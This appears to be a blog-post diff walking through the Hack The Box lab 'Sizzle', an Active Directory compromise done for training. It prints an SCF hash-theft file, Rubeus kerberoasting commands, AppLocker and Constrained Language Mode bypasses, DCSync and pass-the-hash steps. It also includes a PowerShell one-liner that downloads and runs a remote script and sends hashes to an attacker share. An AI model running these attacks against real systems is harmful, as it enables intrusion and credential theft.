@@ -1,0 +1,372 @@
+<h3 id="summary">Summary</h3>
+<ul>
+  <li>A <strong>Windows Domain Controller</strong> machine. We find an <strong>SMB share</strong> containing a <em>writable</em> folder called <code class="language-plaintext highlighter-rouge">Public</code>. We place an <code class="language-plaintext highlighter-rouge">SCF</code> file there that <em>directs the visiting user’s computer</em> to our listening <code class="language-plaintext highlighter-rouge">responder</code> where we capture his <code class="language-plaintext highlighter-rouge">NTLMv2</code> hash.</li>
+  <li><em>After cracking it,</em> we get the password for the <code class="language-plaintext highlighter-rouge">amanda</code> user which we use to enumerate the domain using <code class="language-plaintext highlighter-rouge">BloodHound</code>.</li>
+  <li><em>Noticing that our user has</em> <strong>PowerShell Remoting</strong> <em>capabilities,</em> we try to gain access but are faced with a <em>strange authentication error</em>.</li>
+  <li><em>Upon inspecting the functionality of the</em> <code class="language-plaintext highlighter-rouge">Evil-Winrm</code> <em>tool,</em> we find that we can use a <em>certificate</em> for logging in.</li>
+  <li>We create a <strong>Certificate Signing Request</strong> using <code class="language-plaintext highlighter-rouge">openssl</code> and get it signed from the <strong>ADCS Web Interface</strong> found on the domain controller.</li>
+  <li><em>Using</em> <code class="language-plaintext highlighter-rouge">evil-winrm</code>‘<em>s ability to authenticate using SSL certificates,</em> we successfully achieve code execution.</li>
+  <li>Looking back at the output of <code class="language-plaintext highlighter-rouge">BloodHound</code> showed a <em>kerberoastable</em> user called <code class="language-plaintext highlighter-rouge">mrlky</code> that has dangerous rights abusable for a <code class="language-plaintext highlighter-rouge">DCSync</code> attack.</li>
+  <li>We decide to use <code class="language-plaintext highlighter-rouge">Rubeus.exe</code> to do the job but can’t execute it due to <strong>Applocker</strong> restrictions.</li>
+  <li>We bypass by moving it to the Windows <code class="language-plaintext highlighter-rouge">temp</code> folder and are faced with another error requiring us to authenticate to the network.</li>
+  <li>We add the <code class="language-plaintext highlighter-rouge">amanda</code>’s credentials as flags to the <code class="language-plaintext highlighter-rouge">Rubeus</code> tool and manage to kerberoast <code class="language-plaintext highlighter-rouge">mrkly</code>.</li>
+  <li>We crack his <code class="language-plaintext highlighter-rouge">TGS</code> hash and are able to get the password. We then proceed to <code class="language-plaintext highlighter-rouge">DCSync</code> and obtain the <code class="language-plaintext highlighter-rouge">NTLM hash</code> for the <code class="language-plaintext highlighter-rouge">administrator</code> account and <code class="language-plaintext highlighter-rouge">PTH</code> to gain complete access.</li>
+  <li>Bonus: Bypassing <strong>PowerShell Contrained Language Mode</strong>, dodging <strong>Applocker</strong>, <strong>authenticating</strong> to the network and <strong>Kerberoasting</strong> all in a <strong>one-liner</strong> and <em>without touching disk</em>.</li>
+  <li>Joke Section: Pwning the box with <strong>ZeroLogon</strong> XD</li>
+</ul>
+
+<hr />
+
+<h3 id="nmap">Nmap</h3>
+<p>The nmap output gives some good information:</p>
+<ul>
+  <li><strong>Machine Name:</strong> Sizzle</li>
+  <li><strong>Domain Name:</strong> HTB.local</li>
+  <li><strong>FTP</strong> with <em>anonymous</em> login allowed</li>
+  <li><strong>IIS</strong> 10.0 on port 80 which indicates server 2016+ or windows 10</li>
+  <li><strong>SMB</strong> on port 445</li>
+  <li><strong>LDAP</strong> and <strong>GC</strong> on ports 389 and 3268</li>
+  <li><strong>WinRM</strong> on 5985/5986 which is always nice to have</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: Site doesn't have a title (text/html).
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+|_ssl-date: 2022-04-30T19:56:16+00:00; -1s from scanner time.
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
+|_ssl-date: 2022-04-30T19:56:16+00:00; 0s from scanner time.
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| tls-alpn: 
+|   h2
+|_  http/1.1
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2022-04-30T19:56:16+00:00; 0s from scanner time.
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2022-04-30T19:56:16+00:00; 0s from scanner time.
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2022-04-30T19:56:16+00:00; 0s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL
+| Not valid before: 2018-07-02T20:26:23
+|_Not valid after:  2019-07-02T20:26:23
+|_http-server-header: Microsoft-HTTPAPI/2.0
+| tls-alpn: 
+|   h2
+|_  http/1.1
+|_ssl-date: 2022-04-30T19:56:16+00:00; -1s from scanner time.
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49677/tcp open  msrpc         Microsoft Windows RPC
+49686/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49688/tcp open  msrpc         Microsoft Windows RPC
+49689/tcp open  msrpc         Microsoft Windows RPC
+49692/tcp open  msrpc         Microsoft Windows RPC
+49698/tcp open  msrpc         Microsoft Windows RPC
+49707/tcp open  msrpc         Microsoft Windows RPC
+49713/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2022-04-30T19:55:42
+|_  start_date: 2022-04-30T19:49:45
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+</code></pre></div></div>
+
+<h3 id="anonymous-ftp">Anonymous FTP</h3>
+<p>No files were there, and we’re not granted <code class="language-plaintext highlighter-rouge">write</code> access either. So we move on.</p>
+
+<p><img src="/assets/Sizzle/Anon-FTP-no-write.jpg" alt="Anon-FTP-no-write" /></p>
+
+<h3 id="httphttps">HTTP/HTTPs</h3>
+<p>The home page just shows a <code class="language-plaintext highlighter-rouge">GIF</code> of bacon sizzling…</p>
+
+<p><img src="/assets/Sizzle/http-homepage.jpg" alt="http-homepage" /></p>
+
+<p>Spidering with <code class="language-plaintext highlighter-rouge">gobuster</code> shows an interesting directory <code class="language-plaintext highlighter-rouge">/certsrv</code> which indicates that the <strong>ADCS role</strong> is installed on this server. We note this down.</p>
+
+<p><img src="/assets/Sizzle/gobuser-output.jpg" alt="gobuser-output" /></p>
+
+<p>the <strong>HTTPS</strong> website is similar in structure. so we move along.</p>
+
+<h3 id="ldap">LDAP</h3>
+<p>The output of <code class="language-plaintext highlighter-rouge">ldapsearch</code> didn’t show much information.</p>
+
+<p><img src="/assets/Sizzle/ldapsearch-output.jpg" alt="ldapsearch-output" /></p>
+
+<p>(<em>I grepped out some unnecessary lines from the output to make it smaller.</em>)</p>
+
+<h3 id="smb">SMB</h3>
+<p>Enumerating SMB with <code class="language-plaintext highlighter-rouge">crackmapexec</code> reveals that we have <code class="language-plaintext highlighter-rouge">read</code> access to the <code class="language-plaintext highlighter-rouge">Department Shares</code> folder.</p>
+
+<p><img src="/assets/Sizzle/cme-smb-share-enum.jpg" alt="cme-smb-share-enum" /></p>
+
+<p><em>After mounting it,</em> we notice a couple of folders:</p>
+
+<p><img src="/assets/Sizzle/dpt-shares-folders.jpg" alt="dpt-shares-folders" /></p>
+
+<p>the <code class="language-plaintext highlighter-rouge">Users</code> folder contained some usernames which we save in a list for later use:</p>
+
+<p><img src="/assets/Sizzle/userlist-from-smb.jpg" alt="userlist-from-smb" /></p>
+
+<p>We find some files in the <code class="language-plaintext highlighter-rouge">ZZ_ARCHIVE</code> folder but they dont have any content:</p>
+
+<p><img src="/assets/Sizzle/zz-archive-files.jpg" alt="zz-archive-files" /></p>
+
+<p>we loop over the files using the <code class="language-plaintext highlighter-rouge">file</code> command and <code class="language-plaintext highlighter-rouge">grep</code> out any empty hex line with <code class="language-plaintext highlighter-rouge">xxd</code> to find nothing there as well.</p>
+
+<p><img src="/assets/Sizzle/checking_zz_archive.jpg" alt="checking_zz_archive" /></p>
+
+<p><em>Since we were nearing a dead end with our enumeration,</em> we’re going to use a simple <code class="language-plaintext highlighter-rouge">bash</code> script to check for <code class="language-plaintext highlighter-rouge">write</code> access in the SMB share.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash
+list=$(find /mnt -type d)
+for d in $list
+do
+        touch $d/just-a-test-dir 2&gt;/dev/null
+        if [ $? -eq 0 ]
+        then
+                echo -e "\e[32m[+] $d is writable\e[0m"
+                rm $d/just-a-test-dir
+        else
+                echo -e "\e[31m[-] $d is not writable\e[0m"
+        fi
+done
+</code></pre></div></div>
+
+<ol>
+  <li>it does a <code class="language-plaintext highlighter-rouge">find</code> on the mount point with the <code class="language-plaintext highlighter-rouge">-type d</code> flag to get <em>only directories</em>.</li>
+  <li>then attempts to create a file in each one using <code class="language-plaintext highlighter-rouge">touch</code></li>
+  <li>It prints out if the folder is writable or not</li>
+  <li>then clears the test file if the folder is writable.</li>
+</ol>
+
+<p><img src="/assets/Sizzle/check-write-script-results.jpg" alt="check-write-script-results" /></p>
+
+<p>The results show that we have <code class="language-plaintext highlighter-rouge">write</code> access in both the <code class="language-plaintext highlighter-rouge">Public</code> and <code class="language-plaintext highlighter-rouge">ZZ_ARCHIVE</code> folders.</p>
+
+<p>Having this access would allow us to <em>plant a malicious type of file</em> that would enable us to <em>steal</em> <strong>NTLMv2 hashes</strong> from users who access these locations.</p>
+
+<h3 id="scf-file-attacks-for-hash-theft">SCF File Attacks for Hash Theft</h3>
+<p>SCF (Shell Command Files) are files that can perform actions in <strong>Windows Explorer</strong>. One functionality can be <em>abused</em> to have the <em>share-visiting</em> user <em>directed</em> to our kali machine.</p>
+
+<p>This can be done using a file with the below content:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Shell]
+Command=2
+IconFile=\\10.10.16.7\share\pwn.ico
+[Taskbar]
+Command=ToggleDesktop
+</code></pre></div></div>
+
+<p><em>Essentially,</em> this tells <strong>File Explorer</strong> to <em>fetch</em> the icon for the <code class="language-plaintext highlighter-rouge">.scf</code> file from a network share (<em>our kali box in this case</em>).</p>
+
+<p>We’re going to fire up <code class="language-plaintext highlighter-rouge">responder</code> making sure the <code class="language-plaintext highlighter-rouge">Responder.conf</code> file has the <code class="language-plaintext highlighter-rouge">SMB</code> server set to <code class="language-plaintext highlighter-rouge">ON</code>.</p>
+
+<p>And then copy the <code class="language-plaintext highlighter-rouge">.scf</code> file to <code class="language-plaintext highlighter-rouge">\\10.10.10.103\Department Shares\Users\Public</code> as well as the <code class="language-plaintext highlighter-rouge">ZZ_ARCHIVE</code> folders to make sure any visitor gives us his/her hash.</p>
+
+<p><img src="/assets/Sizzle/amanda-hash-captured.jpg" alt="amanda-hash-captured" /></p>
+
+<p>We manage to get a response from the <code class="language-plaintext highlighter-rouge">amanda</code> user right away :D</p>
+
+<p>We then get to cracking with <code class="language-plaintext highlighter-rouge">john</code></p>
+
+<p><img src="/assets/Sizzle/amanda-hash-cracked.jpg" alt="amanda-hash-cracked" /></p>
+
+<p>the password turns out to be <code class="language-plaintext highlighter-rouge">Ashare1972</code></p>
+
+<h3 id="the-winrm-situation">The WinRM situation</h3>
+<p>We first validate the creds for <code class="language-plaintext highlighter-rouge">amanda</code> with <code class="language-plaintext highlighter-rouge">crackmapexec</code> via SMB and they work.</p>
+
+<p>So we try WinRM after but end up with a weird error message:</p>
+
+<p><img src="/assets/Sizzle/cme-smb-yes-winrm-no.jpg" alt="cme-smb-yes-winrm-no" /></p>
+
+<p>at this moment, I wasn’t quite sure what to do. So I moved on to try other things.</p>
+
+<h3 id="domain-enumeration-with-bloodhoundpy">Domain Enumeration With BloodHound.py</h3>
+<p><em>Since I didn’t have code execution,</em> I turned to the <strong>Python</strong> version of <code class="language-plaintext highlighter-rouge">BloodHound</code> to do enumeration with all collection methods:</p>
+
+<p><img src="/assets/Sizzle/bloodhound-py.jpg" alt="bloodhound-py" /></p>
+
+<p><em>Viewing the</em> <code class="language-plaintext highlighter-rouge">amanda</code> <em>user,</em> I saw she did have <strong>PowerShell Remoting</strong> capability when I ran the <code class="language-plaintext highlighter-rouge">Shortest Path from Owned Principles</code> query.</p>
+
+<p><img src="/assets/Sizzle/amanda-can-ps-remote.jpg" alt="amanda-can-ps-remote" /></p>
+
+<h3 id="getting-winrm-to-work">Getting WinRM to work</h3>
+<p><em>Since we have access to the</em> <code class="language-plaintext highlighter-rouge">amanda</code> <em>user’s credentials,</em> we can <em>request</em> a <strong>User Certificate</strong> from <strong>AD Certificate Services.</strong></p>
+
+<p>This can be done after authenticating to <code class="language-plaintext highlighter-rouge">http://10.10.10.103/certsrv</code> and submitting a <strong>Certificate Signing Request</strong> (<strong>CSR</strong> for short).</p>
+
+<p><em>Before visiting the</em> <strong>ADCS</strong> <em>page,</em> we would need to get a <strong>key</strong> and a <strong>CSR</strong>. This can be done using <code class="language-plaintext highlighter-rouge">openssl</code>.</p>
+
+<p>The command should be as below:</p>
+
+<p><code class="language-plaintext highlighter-rouge">openssl req -newkey rsa:2048 -keyout amanda.key -out amanda.csr</code></p>
+
+<p><img src="/assets/Sizzle/gen-key-gen-csr.jpg" alt="gen-key-gen-csr" /></p>
+
+<p>Note the contents of the <code class="language-plaintext highlighter-rouge">.csr</code> file:</p>
+
+<p><img src="/assets/Sizzle/amanda-csr.jpg" alt="amanda-csr" /></p>
+
+<p>We now visit the page:</p>
+
+<p><img src="/assets/Sizzle/cert-srv-1.jpg" alt="cert-srv-1" /></p>
+
+<p><img src="/assets/Sizzle/cert-srv-2.jpg" alt="cert-srv-2" /></p>
+
+<p>we then paste what we copied from <code class="language-plaintext highlighter-rouge">amanda.csr</code></p>
+
+<p><img src="/assets/Sizzle/cert-srv-3.jpg" alt="cert-srv-3" /></p>
+
+<p>And we select the <strong>Base 64 encoded version</strong> and download it.</p>
+
+<p><img src="/assets/Sizzle/cert-srv-4.jpg" alt="cert-srv-4" /></p>
+
+<p><em>Having done all this,</em> we just need to hook both the <code class="language-plaintext highlighter-rouge">.key</code> file and the <code class="language-plaintext highlighter-rouge">.cer</code> we got from <strong>ADCS</strong> to <code class="language-plaintext highlighter-rouge">evil-winrm</code> while using the <code class="language-plaintext highlighter-rouge">-S</code> flag for SSL.</p>
+
+<p>We know so from checking the help:</p>
+
+<p><img src="/assets/Sizzle/evil-winrm-help.jpg" alt="evil-winrm-help" /></p>
+
+<p>And it works like a charm :D</p>
+
+<p><img src="/assets/Sizzle/winrm-success-amanda.jpg" alt="winrm-success-amanda" /></p>
+
+<p>Note: the PEM pass phrase is the one you were asked to enter when generating the private key and CSR with <code class="language-plaintext highlighter-rouge">openssl</code></p>
+
+<h3 id="back-to-bloodhound-graphs-kerberoastable-users">Back to <code class="language-plaintext highlighter-rouge">BloodHound</code> graphs: Kerberoastable Users</h3>
+<p>Inspecting the query <code class="language-plaintext highlighter-rouge">List all Kerberoastable Accounts</code> shows us that a user called <code class="language-plaintext highlighter-rouge">mrlky</code> is vulnerable.</p>
+
+<p><img src="/assets/Sizzle/mrlky-kerberoastable.jpg" alt="mrlky-kerberoastable" /></p>
+
+<p>That user is very special since he has the 2 required rights to perform a <code class="language-plaintext highlighter-rouge">DCSync</code> attack:</p>
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">GetChanges</code></li>
+  <li><code class="language-plaintext highlighter-rouge">GetChangesAll</code></li>
+</ol>
+
+<p><img src="/assets/Sizzle/mrlky-can-dcsync.jpg" alt="mrlky-can-dcsync" /></p>
+
+<p><em>Hence,</em> we need to kerberoast this guy and get his TGS hash :D</p>
+
+<h3 id="roasting-with-rubeus-bypassing-applocker-and-performing-network-authentication">Roasting with Rubeus: Bypassing Applocker and Performing Network Authentication</h3>
+<p><em>After copying</em> <code class="language-plaintext highlighter-rouge">Rubeus.exe</code> <em>from our kali machine over to</em> <code class="language-plaintext highlighter-rouge">amanda</code>‘<em>s documents folder</em>, we find that we can’t execute due to <strong>Applocker.</strong></p>
+
+<p><img src="/assets/Sizzle/rubeus-applocked.jpg" alt="rubeus-applocked" /></p>
+
+<p>Moving it to <code class="language-plaintext highlighter-rouge">c:\windows\temp</code> directory works as a bypass. But we get another error:</p>
+
+<p><img src="/assets/Sizzle/rubeus-no-net-logon.jpg" alt="rubeus-no-net-logon" /></p>
+
+<p>This is because we logged in using a different way: user certificate.</p>
+
+<p><em>In order to carry out this attack,</em> we would need to authenticate to the network.</p>
+
+<p>This can be done using the <code class="language-plaintext highlighter-rouge">/creduser</code>, <code class="language-plaintext highlighter-rouge">/credpassword</code> and <code class="language-plaintext highlighter-rouge">/domain</code> switches in <code class="language-plaintext highlighter-rouge">Rubeus.exe</code>.</p>
+
+<p>The command is: <code class="language-plaintext highlighter-rouge">.\rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972 /domain:htb.local</code></p>
+
+<p><img src="/assets/Sizzle/mrlky-kerberoasted.jpg" alt="mrlky-kerberoasted" /></p>
+
+<p>We’re good! :D</p>
+
+<p>Now we crack the hash for <code class="language-plaintext highlighter-rouge">mrkly</code> again with <code class="language-plaintext highlighter-rouge">john</code>:</p>
+
+<p><img src="/assets/Sizzle/mrlky-cracked.jpg" alt="mrlky-cracked" /></p>
+
+<h3 id="dcsync">DCSync</h3>
+<p><em>Having the password for</em> <code class="language-plaintext highlighter-rouge">mrkly</code>: <code class="language-plaintext highlighter-rouge">Football#7</code>, we’re going to use <code class="language-plaintext highlighter-rouge">Impacket</code>’s <code class="language-plaintext highlighter-rouge">secretsdump.py</code> python script to do a <code class="language-plaintext highlighter-rouge">DCSync</code> attack:</p>
+
+<p><img src="/assets/Sizzle/dcsynced.jpg" alt="dcsynced" /></p>
+
+<p>and follow up with <code class="language-plaintext highlighter-rouge">psexec.py</code> for a quick <strong>Pass-The-Hash</strong> attack to get code execution as <code class="language-plaintext highlighter-rouge">NT Authority\System</code>:</p>
+
+<p><img src="/assets/Sizzle/got-system.jpg" alt="got-system" /></p>
+
+<h3 id="bonus-powershell-contrained-language-mode-bypassing-it-along-with-applocker-and-kerberoasting-without-touching-disk-all-in-a-powershell-one-liner-d">Bonus: PowerShell Contrained Language Mode, Bypassing it along with Applocker and Kerberoasting without touching disk. All in a PowerShell one-liner :D</h3>
+<p>After I initially got the WinRM shell, It kept asking for my PEM pass phrase after each command.</p>
+
+<p>I wanted to get a <code class="language-plaintext highlighter-rouge">nishang</code> shell but couldn’t do the <code class="language-plaintext highlighter-rouge">IEX</code> command (<code class="language-plaintext highlighter-rouge">Invoke-Expression</code>). This was because of <strong>PowerShell’s Contrained Language Mode</strong>.</p>
+
+<p><img src="/assets/Sizzle/constrained-language-mode.jpg" alt="constrained-language-mode" /></p>
+
+<p><strong>Contrained Language Mode</strong> disables a few PowerShell commands that can be dangerous.</p>
+
+<p><em>Fortunately,</em> it can be bypassed by <em>downgrading</em> to <strong>PowerShell</strong> version 2.</p>
+
+<p>We’re going to be abusing the <code class="language-plaintext highlighter-rouge">Start-Process</code> command to start a <code class="language-plaintext highlighter-rouge">powershell.exe</code> with <code class="language-plaintext highlighter-rouge">-v 2</code> and the command <code class="language-plaintext highlighter-rouge">-c IEX(New-Object Net.webClient).downloadString('http://10.10.16.7/Invoke-Kerberoast.ps1')</code> as arguments.</p>
+
+<p>This is to:</p>
+<ol>
+  <li>Start a <strong>PowerShell</strong> version 2 process without locking the terminal.</li>
+  <li>Import the <code class="language-plaintext highlighter-rouge">Invoke-Kerberoast</code> code into memory.</li>
+  <li>Execute the command <code class="language-plaintext highlighter-rouge">Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII \\10.10.16.7\share\roasted.txt</code>.</li>
+  <li>Output the TGS hash of the <code class="language-plaintext highlighter-rouge">mrlky</code> user to our SMB share.</li>
+</ol>
+
+<p>we will use the <code class="language-plaintext highlighter-rouge">-Credential</code> paramer with <code class="language-plaintext highlighter-rouge">Start-Process</code> to create the Network Authentication needed for the attack to succeed.</p>
+
+<p><em>That way,</em> we’ve hit multiple birds with one stone.</p>
+<ol>
+  <li>We never had to deal with <strong>Applocker</strong></li>
+  <li>Dodged <strong>Contrained Language Mode</strong></li>
+  <li>Created the needed <strong>Network Logon</strong></li>
+  <li><strong>Kerberoasted</strong> <em>without ever touching the victim’s disk</em></li>
+</ol>
+
+<p><img src="/assets/Sizzle/bonus-kill.jpg" alt="bonus-kill" /></p>
+
+<h3 id="joke-section-pwning-the-box-with-zerologon-xd">Joke Section: Pwning the box with <code class="language-plaintext highlighter-rouge">ZeroLogon</code> XD</h3>
+
+<p>You could do all of the above.</p>
+
+<p>OR…</p>
+
+<p><img src="/assets/Sizzle/zero-logon-XD.jpg" alt="zero-logon-XD" /></p>
